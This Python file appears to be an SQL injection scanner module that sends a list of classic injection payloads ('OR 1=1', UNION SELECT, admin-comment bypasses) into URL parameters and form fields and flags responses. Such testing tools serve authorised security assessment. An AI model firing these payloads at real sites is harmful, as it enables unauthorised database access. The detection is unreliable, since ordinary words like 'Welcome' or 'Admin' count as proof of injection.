"""
Generic SQL Injection Scanner
"""
from src.scanners.base import BaseScanner
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class SQLInjectionScanner(BaseScanner):
    def __init__(self, session, logger, verbose=False):
        super().__init__(session, logger, verbose)
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT 1,2,3 -- ",
            "' AND 1=1 -- ",
            "' AND 1=2 -- ",
            "1' ORDER BY 1 -- ",
            "1' ORDER BY 10 -- ",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR '1'='1'#",
            "\" OR \"1\"=\"1",
            "or 1=1--",
            "or 1=1#",
            "' or 1=1--",
        ]
        self.error_indicators = [
            "mysql_fetch_array()",
            "You have an error in your SQL syntax",
            "Warning: mysql",
            "MySQL server version",
            "SQL syntax",
            "unexpected end",
            "unknown column",
            "supplied argument is not a valid MySQL",
        ]
        self.success_indicators = ["First name:", "Surname:", "Welcome", "Hello", "Hi ", "User ID:", "Logged in as", "Dashboard", "My Account", "Admin"]

    def test_url(self, url, method='GET'):
        self.logger.debug(f"Testing URL for SQLi: {url}")
        parsed = urlparse(url)
        params = parse_qs(parsed.query) if parsed.query else {}
        if not params:
            return False

        for param in params:
            for payload in self.payloads:
                injected_url = self._inject_parameter(url, param, payload)
                if not injected_url:
                    continue
                try:
                    if method.upper() == 'POST':
                        # For URL with parameters, we assume GET; if POST needed, handle separately.
                        response = self.session.post(injected_url, timeout=10)
                    else:
                        response = self.session.get(injected_url, timeout=10)
                    if self._is_sql_injection_successful(response.text):
                        self.logger.warning(f"💉 SQLi found: {url} param={param} payload={payload}")
                        self.vulnerabilities_found.append({
                            "type": "SQL Injection",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "severity": "High"
                        })
                        return True
                except Exception as e:
                    self.logger.debug(f"Error testing {param}: {e}")
        return False

    def test_form(self, form):
        self.logger.debug(f"Testing form for SQLi: {form['url']}")
        inputs = form.get('inputs', [])
        testable = [i for i in inputs if i.get('name')]
        if not testable:
            return False

        for inp in testable:
            param = inp['name']
            for payload in self.payloads:
                data = self._build_form_data(form, param, payload)
                try:
                    if form['method'].upper() == 'POST':
                        response = self.session.post(form['url'], data=data, timeout=10)
                    else:
                        response = self.session.get(form['url'], params=data, timeout=10)
                    if self._is_sql_injection_successful(response.text):
                        self.logger.warning(f"💉 SQLi found in form {form['url']} param={param} payload={payload}")
                        self.vulnerabilities_found.append({
                            "type": "SQL Injection",
                            "url": form['url'],
                            "parameter": param,
                            "payload": payload,
                            "severity": "High"
                        })
                        return True
                except Exception as e:
                    self.logger.debug(f"Error testing form {param}: {e}")
        return False

    def _is_sql_injection_successful(self, response_text):
        text = response_text.lower()
        for indicator in self.error_indicators:
            if indicator.lower() in text:
                return True
        for indicator in self.success_indicators:
            if indicator.lower() in text:
                return True
        return False